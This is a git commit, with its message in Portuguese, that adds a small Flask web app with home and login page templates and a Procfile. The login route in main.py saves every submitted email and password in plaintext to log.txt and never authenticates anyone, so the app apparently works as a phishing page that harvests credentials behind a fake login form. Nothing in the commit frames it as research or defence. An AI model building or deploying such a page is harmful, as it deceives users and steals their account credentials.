b53de3369b4640663d1aabb71034ba271efdc105
https-richardy <code.richardy@gmail.com>
2023-02-24 01:36:55 -0300

    No ramo master
     Submissão inicial.
    
     Mudanças a serem submetidas:
    	new file:   Procfile
    	new file:   log.txt
    	new file:   main.py
    	new file:   requirements.txt
    	new file:   templates/home_page/index.html
    	new file:   templates/home_page/style.css
    	new file:   templates/login/index.html
    	new file:   templates/login/style.css

---
+++ main.py
@@ -0,0 +1,21 @@
+from flask import Flask, render_template, request, jsonify
+
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+	return render_template('home_page/index.html')
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        userLoginId = request.form['userLoginId']
+        password = request.form['password']
+        
+        with open('log.txt', 'a') as f:
+            f.write(f'Email: {userLoginId} | Senha: {password}\n')
+    return render_template('login/index.html')
+
+
+app.run()
+
